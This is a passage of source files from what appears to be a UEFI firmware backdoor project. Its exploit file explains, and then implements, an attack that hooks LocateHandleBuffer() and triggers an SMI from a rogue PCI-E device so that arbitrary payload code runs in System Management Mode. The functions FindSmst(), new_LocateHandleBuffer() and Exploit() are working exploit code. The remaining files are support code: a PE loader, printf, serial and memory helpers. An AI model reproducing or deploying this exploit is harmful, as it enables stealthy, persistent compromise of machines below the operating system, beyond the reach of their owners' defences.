                          &HandleBuffer
                          );

          // ...


    This handler is being registered at the beginning of the SMM core exeuction and 
    being unregistered by SMM ready to lock event handler:

        EFI_STATUS
        EFIAPI
        SmmReadyToLockHandler (
          IN     EFI_HANDLE  DispatchHandle,
          IN     CONST VOID  *Context,        OPTIONAL
          IN OUT VOID        *CommBuffer,     OPTIONAL
          IN OUT UINTN       *CommBufferSize  OPTIONAL
          )
        {
          // ...

          //
          // Unregister SMI Handlers that are no required after the SMM driver dispatch is stopped
          //
          for (Index = 0; mSmmCoreSmiHandlers[Index].HandlerType != NULL; Index++) {
            if (mSmmCoreSmiHandlers[Index].UnRegister) {
              SmiHandlerUnRegister (mSmmCoreSmiHandlers[Index].DispatchHandle);
            }
          }

          // ...


    DXE part of SMM core registers DXE dispatch event handler and fires appropriate SMI to 
    execute SmmDriverDispatchHandler() when this event occurrs:

        VOID
        EFIAPI
        SmmIplDxeDispatchEventNotify (
          IN EFI_EVENT  Event,
          IN VOID       *Context
          )
        {
          // ...

          //
          // Keep calling the SMM Core Dispatcher until there is no request to restart it.
          //
          while (TRUE) {
            //
            // Use Guid to initialize EFI_SMM_COMMUNICATE_HEADER structure
            // Clear the buffer passed into the Software SMI.  This buffer will return
            // the status of the SMM Core Dispatcher.
            //
            CopyGuid (&mCommunicateHeader.HeaderGuid, (EFI_GUID *)Context);
            mCommunicateHeader.MessageLength = 1;
            mCommunicateHeader.Data[0] = 0;

            //
            // Generate the Software SMI and return the result
            //
            Size = sizeof (mCommunicateHeader);
            SmmCommunicationCommunicate (&mSmmCommunication, &mCommunicateHeader, &Size);

            //
            // Return if there is no request to restart the SMM Core Dispatcher
            //
            if (mCommunicateHeader.Data[0] != COMM_BUFFER_SMM_DISPATCH_RESTART) {
              return;
            }

            //
            // Close all SMRAM ranges to protect SMRAM
            // NOTE: SMRR is enabled by CPU SMM driver by calling SmmCpuFeaturesInitializeProcessor() 
            //       from SmmCpuFeaturesLib so no need to reset the SMRAM to UC in MTRR.
            //
            Status = mSmmAccess->Close (mSmmAccess);

          // ...


    This exploit is able to work due to the fact that PCI-E bus intialization 
    happens way before DXE dispatch event, so it overwrites LocateHandleBuffer() 
    with the arbitrary SMM code address and manually fires SmmDriverDispatchHandler() 
    SMI in order to execute this code.

    Rogue PCI-E device is used to inject this exploit into the boot sequence of the
    target machine before DXE dispatch event.
*/
//--------------------------------------------------------------------------------------
// to be used in FindSmst() function
#define SMST_MEM_ALIGN sizeof(UINT64)

// SMRAM region is usually located in lower part of physical memory range
#define SMST_CHECK_ADDR(_addr_) ((UINT64)(_addr_) != 0 && ((UINT64)(_addr_) >> 32) == 0)

EFI_SMM_SYSTEM_TABLE2 *FindSmst(void)
{
    UINTN i = 0, p = 0, n = 0;

    // for VirtualAddrValid() calls
    UINT64 Cr3 = __readcr3();

    // enumerate SMRAM regions
    for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
    {
        // enumerate memory pages for each region
        for (p = 0; p < m_SmramMap[i].PhysicalSize; p += PAGE_SIZE)
        {
            UINT64 Addr = m_SmramMap[i].PhysicalStart + p;

            // check for valid virtual address
            if (VirtualAddrValid(Addr, Cr3))
            {
                for (n = 0; n < PAGE_SIZE; n += SMST_MEM_ALIGN)
                {
                    EFI_SMM_SYSTEM_TABLE2 *Smst = (EFI_SMM_SYSTEM_TABLE2 *)(Addr + n);

                    // check for valid SMM system table 2 header
                    if (Smst->Hdr.Signature == SMM_SMST_SIGNATURE && (Smst->Hdr.Revision >> 16) != 0)
                    {
                        // sanity check some function pointers as well
                        if (SMST_CHECK_ADDR(Smst->SmmAllocatePool) &&
                            SMST_CHECK_ADDR(Smst->SmmAllocatePages) &&
                            SMST_CHECK_ADDR(Smst->SmmFreePool) &&
                            SMST_CHECK_ADDR(Smst->SmmFreePages))
                        {
                            return Smst;
                        }
                    }
                }
            }
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI new_LocateHandleBuffer(
    EFI_LOCATE_SEARCH_TYPE SearchType, 
    EFI_GUID *Protocol, 
    VOID *SearchKey, 
    UINTN *NoHandles, 
    EFI_HANDLE **Buffer)
{    
    EFI_SMM_SYSTEM_TABLE2 *Smst = NULL;

    // indicate successful exploitation
    m_bSmmHandlerExecuted = TRUE; 
    
    if (m_ExploitProc)
    {
        // find SMM system table
        if ((Smst = FindSmst()) != NULL)
        {
            // call payoad
            m_ExploitProc(Smst);
        }  
    }

    /*
        Here we need to return an error code to immediately exit
        from the SmmDriverDispatchHandler() and prevent any side effects.
    */
    return EFI_NOT_FOUND;
}
//--------------------------------------------------------------------------------------
EFI_STATUS Exploit(EXPLOIT_PROC ExploitProc)
{
    EFI_STATUS Status = 0;    
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    
    EFI_SMM_COMMUNICATION_PROTOCOL *SmmComm = NULL;   
    UINTN Size = sizeof(m_CommunicateHeader); 

    m_ExploitProc = ExploitProc;
    m_bSmmHandlerExecuted = FALSE;    

    if ((Status = m_BS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&SmmBase)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
        return Status;
    }

    if ((Status = m_BS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&SmmComm)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
        return Status;
    }

    DbgMsg(
        __FILE__, __LINE__, 
        "SMM communicate header is at "FPTR"\r\n", &m_CommunicateHeader
    );

    // set up communicate header
    m_BS->CopyMem(&m_CommunicateHeader.HeaderGuid, &gEfiEventDxeDispatchGuid, sizeof(EFI_GUID));

    m_CommunicateHeader.MessageLength = 1;
    m_CommunicateHeader.Data[0] = 0;

    // hook LocateHandleBuffer()
    old_LocateHandleBuffer = m_BS->LocateHandleBuffer;
    m_BS->LocateHandleBuffer = new_LocateHandleBuffer;

    DbgMsg(__FILE__, __LINE__, "Executing SMM callback...\r\n");

    // call SMM callback
    Status = SmmComm->Communicate(SmmComm, &m_CommunicateHeader, &Size);

    if (!m_bSmmHandlerExecuted)
    {
        // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
        GenerateSoftwareSMI(0, 0xff);
    }

    // restore LocateHandleBuffer()
    m_BS->LocateHandleBuffer = old_LocateHandleBuffer;
    
    DbgMsg(
        __FILE__, __LINE__, 
        "Communicate(): status = 0x%.8x, size = 0x%.8x\r\n", Status, Size
    );

    if (m_bSmmHandlerExecuted)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation success\r\n");        

        return EFI_SUCCESS;
    }
    
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation fails\r\n");        

    return EFI_LOAD_ERROR;
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/exploit.h`:

```h

#ifndef _EXPLOIT_H_
#define _EXPLOIT_H_

typedef VOID (* EXPLOIT_PROC)(EFI_SMM_SYSTEM_TABLE2 *Smst);

EFI_STATUS Exploit(EXPLOIT_PROC ExploitProc);

#endif

```

`src/loader.c`:

```c
#include <FrameworkSmm.h>

#include <IndustryStandard/PeImage.h>

#include "common.h"
#include "loader.h"
//--------------------------------------------------------------------------------------
BOOLEAN LdrProcessRelocs(VOID *Image, VOID *NewBase)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)
        ((UINT8 *)Image + ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);    

    UINT32 RelocationSize = 
        pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    UINT32 RelocationAddr = 
        pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

    EFI_IMAGE_BASE_RELOCATION *pRelocation = NULL;
    UINTN OldBase = pHeaders->OptionalHeader.ImageBase, Size = 0;

    if (OldBase == (UINTN)NewBase)
    {
        // image rebase is not needed
        return TRUE;
    }

    if (RelocationSize == 0 || RelocationAddr == 0)
    {
        // there's nothing to rebase
        return TRUE;
    }

    pRelocation = (EFI_IMAGE_BASE_RELOCATION *)RVATOVA(Image, RelocationAddr);

    while (RelocationSize > Size && pRelocation->SizeOfBlock)
    {            
        UINT32 Number = (pRelocation->SizeOfBlock - 8) / 2, i = 0;
        UINT16 *Rel = (UINT16 *)((UINT8 *)pRelocation + 8);            

        for (i = 0; i < Number; i++)
        {
            if (Rel[i] > 0)
            {
                UINT16 Type = (Rel[i] & 0xF000) >> 12;
                VOID *Addr = (VOID *)RVATOVA(Image, pRelocation->VirtualAddress + (Rel[i] & 0x0FFF));                    

#if defined(_M_X64) || defined(__amd64__)

                if (Type == EFI_IMAGE_REL_BASED_DIR64)
                {                        
                    *(UINT64 *)Addr += (UINT64)NewBase - OldBase;
                }                    
#else                    
                if (Type == EFI_IMAGE_REL_BASED_HIGHLOW)
                {
                    *(UINT32 *)Addr += (UINT32)NewBase - OldBase;
                }
#endif
                else
                {
                    // unknown relocation type
                    return FALSE;
                }
            }
        }

        pRelocation = (EFI_IMAGE_BASE_RELOCATION *)((UINT8 *)pRelocation + pRelocation->SizeOfBlock);
        Size += pRelocation->SizeOfBlock;            
    }

    return TRUE;
}
//--------------------------------------------------------------------------------------
UINT32 LdrGetProcAddress(VOID *Image, char *lpszFunctionName)
{
    EFI_IMAGE_EXPORT_DIRECTORY *pExport = NULL;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)
        ((UINT8 *)Image + ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);

    if (pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
    {
        pExport = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(
            Image,
            pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        );
    }

    if (pExport)
    {
        UINT32 *AddressOfFunctions = (UINT32 *)RVATOVA(Image, pExport->AddressOfFunctions);
        INT16 *AddrOfOrdinals = (INT16 *)RVATOVA(Image, pExport->AddressOfNameOrdinals);
        UINT32 *AddressOfNames = (UINT32 *)RVATOVA(Image, pExport->AddressOfNames);
        UINT32 i = 0;

        for (i = 0; i < pExport->NumberOfFunctions; i++)
        {
            if (!strcmp((char *)RVATOVA(Image, AddressOfNames[i]), lpszFunctionName))
            {
                return AddressOfFunctions[AddrOfOrdinals[i]];
            }
        }
    }

    return 0;
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/loader.h`:

```h

#ifndef _LOADER_H_
#define _LOADER_H_

#if defined(_M_X64) || defined(__amd64__)

typedef EFI_IMAGE_NT_HEADERS64 EFI_IMAGE_NT_HEADERS;

#else

typedef EFI_IMAGE_NT_HEADERS32 EFI_IMAGE_NT_HEADERS;

#endif

#define LDR_UPDATE_RELOCS(_addr_, _old_, _new_)                                                      \
                                                                                                     \
    {                                                                                                \
        EFI_IMAGE_NT_HEADERS *nt_h = (EFI_IMAGE_NT_HEADERS *)RVATOVA((_addr_),                       \
            ((EFI_IMAGE_DOS_HEADER *)(_addr_))->e_lfanew);                                           \
                                                                                                     \
        LdrProcessRelocs(                                                                            \
            (_addr_),                                                                                \
            (VOID *)((UINT8 *)nt_h->OptionalHeader.ImageBase - (UINT8 *)(_old_) + (UINT8 *)(_new_))  \
        );                                                                                           \
    }

BOOLEAN LdrProcessRelocs(VOID *Image, VOID *NewBase);
UINT32 LdrGetProcAddress(VOID *Image, char *lpszFunctionName);

#endif
```

`src/ovmf.h`:

```h

#ifndef _OVMF_H_
#define _OVMF_H_

/* 
    The default OVMF build writes debug messages to this IO port.
*/
#define OVMF_DEBUG_PORT 0x402

#endif

```

`src/printf.c`:

```c
/*
    File: tinyprintf.c

    Copyright (C) 2004  Kustaa Nyholm

    This library is free software; you can redistribute it and/or
    modify it under the terms of the GNU Lesser General Public
    License as published by the Free Software Foundation; either
    version 2.1 of the License, or (at your option) any later version.

    This library is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
    Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public
    License along with this library; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#include "printf.h"

/**
 * Configuration
 */

/* Enable long int support */
#define PRINTF_LONG_SUPPORT

#if defined(_M_X64) || defined(__amd64__)

/* Enable long long int support (implies long int support) */
#define PRINTF_LONG_LONG_SUPPORT

#endif

/* Enable %z (size_t) support */
#define PRINTF_SIZE_T_SUPPORT

/**
 * Configuration adjustments
 */
#ifdef PRINTF_SIZE_T_SUPPORT
#include <sys/types.h>
#endif

#ifdef PRINTF_LONG_LONG_SUPPORT
#define PRINTF_LONG_SUPPORT
#endif

/* __SIZEOF_<type>__ defined at least by gcc */
#ifdef __SIZEOF_POINTER__
#define SIZEOF_POINTER __SIZEOF_POINTER__
#endif

#ifdef __SIZEOF_LONG_LONG__
#define SIZEOF_LONG_LONG __SIZEOF_LONG_LONG__
#endif

#ifdef __SIZEOF_LONG__
#define SIZEOF_LONG __SIZEOF_LONG__
#endif

#ifdef __SIZEOF_INT__
#define SIZEOF_INT __SIZEOF_INT__
#endif

#ifdef __GNUC__
#define _TFP_GCC_NO_INLINE_  __attribute__ ((noinline))
#else
#define _TFP_GCC_NO_INLINE_
#endif

/**
 * Implementation
 */
struct param 
{
    char leading_zeros : 1; // Leading zeros
    char alt_form : 1;      // Alternate form
    char upper_case : 1;    // Upper case (for base16 only)
    char align_left : 1;    // 0 == align right (default), 1 == align left
    unsigned int width;     // Field width
    unsigned int base;      // Number base (e.g.: 8, 10, 16)
    char sign;              // The sign to display (if any)
    char *buff;             // Buffer to output
};

#ifdef PRINTF_LONG_LONG_SUPPORT

static void _TFP_GCC_NO_INLINE_ ulli2a(unsigned long long int num, struct param *p)
{
    int n = 0;
    unsigned long long int d = 1;
    char *buff = p->buff;

    while (num / d >= p->base)
    {
        d *= p->base;
    }

    while (d != 0) 
    {
        int digit = (int)(num / d);
    
        num %= d;
        d /= p->base;

        if (n || digit > 0 || d == 0) 
        {
            *buff++ = (char)(digit + (digit < 10 ? '0' : (p->upper_case ? 'A' : 'a') - 10));
            ++n;
        }
    }

    *buff = 0;
}

static void lli2a(long long int num, struct param *p)
{
    if (num < 0) 
    {
        num = -num;
        p->sign = '-';
    }

    ulli2a(num, p);
}

#endif // PRINTF_LONG_LONG_SUPPORT

#ifdef PRINTF_LONG_SUPPORT

static void uli2a(unsigned long int num, struct param *p)
{
    int n = 0;
    unsigned long int d = 1;
    char *buff = p->buff;

    while (num / d >= p->base)
    {
        d *= p->base;
    }

    while (d != 0) 
    {
        int digit = num / d;

        num %= d;
        d /= p->base;
        
        if (n || digit > 0 || d == 0) 
        {
            *buff++ = (char)(digit + (digit < 10 ? '0' : (p->upper_case ? 'A' : 'a') - 10));
            ++n;
        }
    }

    *buff = 0;
}

static void li2a(long num, struct param *p)
{
    if (num < 0) 
    {
        num = -num;
        p->sign = '-';
    }

    uli2a(num, p);
}

#endif // PRINTF_LONG_SUPPORT

static void ui2a(unsigned int num, struct param *p)
{
    int n = 0;
    unsigned int d = 1;
    char *buff = p->buff;

    while (num / d >= p->base)
    {
        d *= p->base;
    }

    while (d != 0) 
    {
        int digit = num / d;

        num %= d;
        d /= p->base;
        
        if (n || digit > 0 || d == 0) 
        {
            *buff++ = (char)(digit + (digit < 10 ? '0' : (p->upper_case ? 'A' : 'a') - 10));
            ++n;
        }
    }

    *buff = 0;
}

static void i2a(int num, struct param *p)
{
    if (num < 0) 
    {
        num = -num;
        p->sign = '-';
    }

    ui2a(num, p);
}

static int a2d(char ch)
{
    if (ch >= '0' && ch <= '9')
    {
        return ch - '0';
    }
    else if (ch >= 'a' && ch <= 'f')
    {
        return ch - 'a' + 10;
    }
    else if (ch >= 'A' && ch <= 'F')
    {
        return ch - 'A' + 10;
    }
    
    return -1;
}

static char a2u(char ch, const char **src, int base, unsigned int *nump)
{
    const char *p = *src;
    unsigned int num = 0;
    int digit = 0;

    while ((digit = a2d(ch)) >= 0) 
    {
        if (digit > base)
        {
            break;
        }

        num = num * base + digit;
        ch = *p++;
    }

    *src = p;
    *nump = num;
    
    return ch;
}

static void putchw(void *putp, putcf putf, struct param *p)
{
    char ch;
    int n = p->width;
    char *buff = p->buff;

    /* Number of filling characters */
    while (*buff++ && n > 0)
    {
        n--;
    }

    if (p->sign)
    {
        n--;
    }

    if (p->alt_form && p->base == 16)
    {
        n -= 2;
    }
    else if (p->alt_form && p->base == 8)
    {
        n--;
    }

    /* Fill with space to align to the right, before alternate or sign */
    if (!p->leading_zeros && !p->align_left) 
    {
        while (n-- > 0)
        {
            putf(putp, ' ');
        }
    }

    /* print sign */
    if (p->sign)
    {
        putf(putp, p->sign);
    }

    /* Alternate */
    if (p->alt_form && p->base == 16) 
    {
        putf(putp, '0');
        putf(putp, (p->upper_case ? 'X' : 'x'));
    }
    else if (p->alt_form && p->base == 8) 
    {
        putf(putp, '0');
    }

    /* Fill with zeros, after alternate or sign */
    if (p->leading_zeros) 
    {
        while (n-- > 0)
        {
            putf(putp, '0');
        }
    }

    /* Put actual buffer */
    buff = p->buff;
    while ((ch = *buff++) != 0)
    {
        putf(putp, ch);
    }

    /* Fill with space to align to the left, after string */
    if (!p->leading_zeros && p->align_left) 
    {
        while (n-- > 0)
        {
            putf(putp, ' ');
        }
    }
}

void tfp_format(void *putp, putcf putf, const char *format, va_list va)
{
    struct param p;
    char ch;

#ifdef PRINTF_LONG_SUPPORT

    /* long = 64b on some architectures */
    char bf[23];  

#else

    /* int = 32b on some architectures */
    char bf[12];  

#endif
    
    p.buff = bf;

    while ((ch = *(format++)) != 0) 
    {
        if (ch != '%') 
        {
            putf(putp, ch);
        }
        else 
        {

#ifdef PRINTF_LONG_SUPPORT

            /* 1 for long, 2 for long long */
            char lng = 0;
#endif
            /* Init parameter struct */
            p.leading_zeros = 0;
            p.alt_form = 0;
            p.width = 0;
            p.align_left = 0;
            p.sign = 0;

            /* Flags */
            while ((ch = *(format++)) != 0) 
            {
                switch (ch) 
                {
                case '-':

                    p.align_left = 1;
                    continue;

                case '0':

                    p.leading_zeros = 1;
                    continue;

                case '#':

                    p.alt_form = 1;
                    continue;

                default:

                    break;
                }

                break;
            }

            /* Width */
            if (ch >= '0' && ch <= '9') 
            {
                ch = a2u(ch, &format, 10, &(p.width));
            }

            /**
             * We accept 'x.y' format but don't support it completely:
             * we ignore the 'y' digit => this ignores 0-fill size and makes it == width (ie. 'x') 
             */
            if (ch == '.') 
            {
                /* zero-padding */
                p.leading_zeros = 1;
                
                /* ignore actual 0-fill size: */
                do 
                {
                    ch = *(format++);

                } while ((ch >= '0') && (ch <= '9'));
            }

#ifdef PRINTF_SIZE_T_SUPPORT
#ifdef PRINTF_LONG_SUPPORT

            if (ch == 'z') 
            {
                ch = *(format++);

                if (sizeof(size_t) == sizeof(unsigned long int))
                {
                    lng = 1;
                }

#ifdef PRINTF_LONG_LONG_SUPPORT

                else if (sizeof(size_t) == sizeof(unsigned long long int))
                {
                    lng = 2;
                }
#endif
            }
            else

#endif // PRINTF_LONG_SUPPORT
#endif // PRINTF_SIZE_T_SUPPORT

#ifdef PRINTF_LONG_SUPPORT

            if (ch == 'l') 
            {
                ch = *(format++);
                lng = 1;

#ifdef PRINTF_LONG_LONG_SUPPORT

                if (ch == 'l') 
                {
                    ch = *(format++);
                    lng = 2;
                }
#endif
            }

#endif  // PRINTF_LONG_SUPPORT

            switch (ch) 
            {
            case 0:
            
                goto abort;
            
            case 'u':

                p.base = 10;

#ifdef PRINTF_LONG_SUPPORT
#ifdef PRINTF_LONG_LONG_SUPPORT

                if (2 == lng)
                {
                    ulli2a(va_arg(va, unsigned long long int), &p);
                }
                else
#endif
                if (1 == lng)
                {
                    uli2a(va_arg(va, unsigned long int), &p);
                }
                else

#endif // PRINTF_LONG_SUPPORT
                    
                {
                    ui2a(va_arg(va, unsigned int), &p);
                }

                putchw(putp, putf, &p);
                break;

            case 'd':
            case 'i':

                p.base = 10;

#ifdef PRINTF_LONG_SUPPORT
#ifdef PRINTF_LONG_LONG_SUPPORT

                if (2 == lng)
                {
                    lli2a(va_arg(va, long long int), &p);
                }
                else
#endif
                if (1 == lng)
                {
                    li2a(va_arg(va, long int), &p);
                }
                else

#endif // PRINTF_LONG_SUPPORT

                {
                    i2a(va_arg(va, int), &p);
                }

                putchw(putp, putf, &p);
                break;

#ifdef SIZEOF_POINTER

            case 'p':

                p.alt_form = 1;

# if defined(SIZEOF_INT) && SIZEOF_POINTER <= SIZEOF_INT
                
                lng = 0;

# elif defined(SIZEOF_LONG) && SIZEOF_POINTER <= SIZEOF_LONG
                
                lng = 1;

# elif defined(SIZEOF_LONG_LONG) && SIZEOF_POINTER <= SIZEOF_LONG_LONG

                lng = 2;
#endif
#endif // SIZEOF_POINTER

            case 'x':
            case 'X':

                p.base = 16;
                p.upper_case = (ch == 'X') ? 1 : 0;

#ifdef PRINTF_LONG_SUPPORT
#ifdef PRINTF_LONG_LONG_SUPPORT
                
                if (2 == lng)
                {
                    ulli2a(va_arg(va, unsigned long long int), &p);
                }
                else
#endif
                if (1 == lng)
                {
                    uli2a(va_arg(va, unsigned long int), &p);
                }
                else

#endif // PRINTF_LONG_SUPPORT

                {
                    ui2a(va_arg(va, unsigned int), &p);
                }

                putchw(putp, putf, &p);
                break;

            case 'o':

                p.base = 8;
                ui2a(va_arg(va, unsigned int), &p);
                putchw(putp, putf, &p);
                break;

            case 'c':

                putf(putp, (char)(va_arg(va, int)));
                break;

            case 's':

                p.buff = va_arg(va, char *);
                putchw(putp, putf, &p);
                p.buff = bf;
                break;

            case '%':

                putf(putp, ch);

            default:

                break;
            }
        }
    }

abort:;
}

struct _vsnprintf_putcf_data
{
    char *dest;
    size_t dest_capacity;    
    size_t num_chars;
};

static void _vsnprintf_putcf(void *p, char c)
{
    struct _vsnprintf_putcf_data *data = (struct _vsnprintf_putcf_data*)p;

    if (data->num_chars < data->dest_capacity)
    {
        data->dest[data->num_chars] = c;
    }

    data->num_chars += 1;
}

int tfp_vsnprintf(char *str, size_t size, const char *format, va_list ap)
{
    struct _vsnprintf_putcf_data data;

    if (size < 1)
    {
        return 0;
    }

    data.dest = str;
    data.dest_capacity = size - 1;
    data.num_chars = 0;

    tfp_format(&data, _vsnprintf_putcf, format, ap);

    if (data.num_chars < data.dest_capacity)
    {
        data.dest[data.num_chars] = '\0';
    }
    else
    {
        data.dest[data.dest_capacity] = '\0';
    }

    return (int)data.num_chars;
}

int tfp_snprintf(char *str, size_t size, const char *format, ...)
{
    va_list ap;
    int retval;

    va_start(ap, format);
    retval = tfp_vsnprintf(str, size, format, ap);
    va_end(ap);

    return retval;
}

struct _vsprintf_putcf_data
{
    char *dest;
    size_t num_chars;
};

static void _vsprintf_putcf(void *p, char c)
{
    struct _vsprintf_putcf_data *data = (struct _vsprintf_putcf_data*)p;

    data->dest[data->num_chars++] = c;
}

int tfp_vsprintf(char *str, const char *format, va_list ap)
{
    struct _vsprintf_putcf_data data;

    data.dest = str;
    data.num_chars = 0;
    
    tfp_format(&data, _vsprintf_putcf, format, ap);
    data.dest[data.num_chars] = '\0';
    
    return (int)data.num_chars;
}

int tfp_sprintf(char *str, const char *format, ...)
{
    va_list ap;
    int retval;

    va_start(ap, format);
    retval = tfp_vsprintf(str, format, ap);
    va_end(ap);
    
    return retval;
}

```

`src/printf.h`:

```h
/*
    File: tinyprintf.h

    Copyright (C) 2004  Kustaa Nyholm

    This library is free software; you can redistribute it and/or
    modify it under the terms of the GNU Lesser General Public
    License as published by the Free Software Foundation; either
    version 2.1 of the License, or (at your option) any later version.

    This library is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
    Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public
    License along with this library; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#ifndef _PRINTF_H_
#define _PRINTF_H_

#include <stdarg.h>
#include <stddef.h>

/** 
 * Declaration
 */

#ifdef __GNUC__

#define _TFP_SPECIFY_PRINTF_FMT(fmt_idx, arg1_idx) __attribute__((format(printf, fmt_idx, arg1_idx)))

#else

#define _TFP_SPECIFY_PRINTF_FMT(fmt_idx, arg1_idx)

#endif

#ifdef __cplusplus

extern "C" 
{

#endif

    typedef void (* putcf)(void *, char);

    /*
        'tfp_format' really is the central function for all tinyprintf. For each output character 
        after formatting, the 'putf' callback is called with 2 args:

        - an arbitrary void* 'putp' param defined by the user and passed unmodified from 'tfp_format';
        - the character;

        The 'tfp_printf' and 'tfp_sprintf' functions simply define their own callback and pass to 
        it the right 'putp' it is expecting.
    */
    void tfp_format(void *putp, putcf putf, const char *format, va_list va);

    int tfp_vsnprintf(char *str, size_t size, const char *format, va_list ap);
    int tfp_snprintf(char *str, size_t size, const char *format, ...) _TFP_SPECIFY_PRINTF_FMT(3, 4);
    int tfp_vsprintf(char *str, const char *format, va_list ap);
    int tfp_sprintf(char *str, const char *format, ...) _TFP_SPECIFY_PRINTF_FMT(2, 3);

#ifdef  __cplusplus

}

#endif
#endif

```

`src/serial.c`:

```c
#include <PiPei.h>

#include "serial.h"

/*
    UART Register Offsets
*/
#define BAUD_LOW_OFFSET         0x00
#define BAUD_HIGH_OFFSET        0x01
#define IER_OFFSET              0x01
#define LCR_SHADOW_OFFSET       0x01
#define FCR_SHADOW_OFFSET       0x02
#define IR_CONTROL_OFFSET       0x02
#define FCR_OFFSET              0x02
#define EIR_OFFSET              0x02
#define BSR_OFFSET              0x03
#define LCR_OFFSET              0x03
#define MCR_OFFSET              0x04
#define LSR_OFFSET              0x05
#define MSR_OFFSET              0x06

/*
    UART Register Bit Defines
*/
#define LSR_TXRDY               0x20
#define LSR_RXDA                0x01
#define DLAB                    0x01

#define BAUDRATE_MAX 115200

/*
    UART Settings
*/
UINT8 m_Data = 8;
UINT8 m_Stop = 1;
UINT8 m_Parity = 0;
UINT8 m_BreakSet = 0;
//--------------------------------------------------------------------------------------
/*
    Initialize the serial device hardware.
*/
VOID SerialPortInitialize(UINT16 Port, UINTN Baudrate)
{
    // Map 5..8 to 0..3
    UINT8 Data = (UINT8)(m_Data - (UINT8)5);

    // Calculate divisor for baud generator
    UINTN Divisor = BAUDRATE_MAX / Baudrate;    

    // Set communications format
    UINT8 OutputData = (UINT8)((DLAB << 7) | (m_BreakSet << 6) | (m_Parity << 3) | (m_Stop << 2) | Data);
    __outbyte((UINTN)(Port + LCR_OFFSET), OutputData);

    // Configure baud rate
    __outbyte((UINTN)(Port + BAUD_HIGH_OFFSET), (UINT8)(Divisor >> 8));
    __outbyte((UINTN)(Port + BAUD_LOW_OFFSET), (UINT8)(Divisor & 0xff));

    // Switch back to bank 0
    OutputData = (UINT8)((~DLAB << 7) | (m_BreakSet << 6) | (m_Parity << 3) | (m_Stop << 2) | Data);
    __outbyte((UINTN)(Port + LCR_OFFSET), OutputData);
}
//--------------------------------------------------------------------------------------
/*
    Write data to serial device.
*/
VOID SerialPortWrite(UINT16 Port, UINT8 Data)
{
    UINT8 Status = 0;

    do 
    {
        // Wait for the serail port to be ready
        Status = __inbyte(Port + LSR_OFFSET);

    } while ((Status & LSR_TXRDY) == 0);

    __outbyte(Port, Data);
}
//--------------------------------------------------------------------------------------
/*
    Reads data from a serial device.
*/
UINT8 SerialPortRead(UINT16 Port)
{
    UINT8 Status = 0;

    do 
    {
        // Wait for the serail port to be ready
        Status = __inbyte(Port + LSR_OFFSET);

    } while ((Status & LSR_RXDA) == 0);

    return __inbyte(Port);
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/serial.h`:

```h

#ifndef _SERIAL_H_
#define _SERIAL_H_

#define SERIAL_PORT_0 0x3F8 /* COM1, ttyS0 */

VOID SerialPortInitialize(UINT16 Port, UINTN Baudrate);

VOID SerialPortWrite(UINT16 Port, UINT8 Data);
UINT8 SerialPortRead(UINT16 Port);

#endif

```

`src/std.c`:

```c
#include "common.h"
//--------------------------------------------------------------------------------------
void std_memcpy(void *dst, const void *src, size_t size)
{
    __movsb(dst, src, size);
}
//--------------------------------------------------------------------------------------
size_t std_strlen(const char *str)
{
    if (str)
    {
        size_t i = 0;

        for (; str[i] != '\0'; i++);

        return i;        
    }
 
    return 0;   
}
//--------------------------------------------------------------------------------------
char *std_strcat(char *dst, const char *src)
{
    char *ptr = dst + std_strlen(dst);

    while (*src != '\0')
    {
        // append string
        *ptr++ = *src++;
    }

    // null terminate destination string
    *ptr = '\0';

    return dst;
}
//--------------------------------------------------------------------------------------
// EoF

```

`src/std.h`:

```h

#ifndef _STD_H_
#define _STD_H_

void std_memcpy(void *dst, const void *src, size_t size);

size_t std_strlen(const char *str);

char *std_strcat(char *dst, const char *src);

#endif

```

`src/virtmem.c`:

```c
#include <FrameworkSmm.h>

#include "../config.h"

#include "common.h"
#include "debug.h"
#include "virtmem.h"

#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"

// IA32_EFER MSR register
#define IA32_EFER 0xC0000080

// IA32_EFER.LME flag
#define IA32_EFER_LME 0x100

// CR0 register flags
#define CR0_WP 0x00010000
#define CR0_PG 0x80000000

// CR4 register flags
#define CR4_PAE 0x20

#if defined(BACKDOOR_DEBUG_MEM)

#define DbgMsgMem DbgMsg

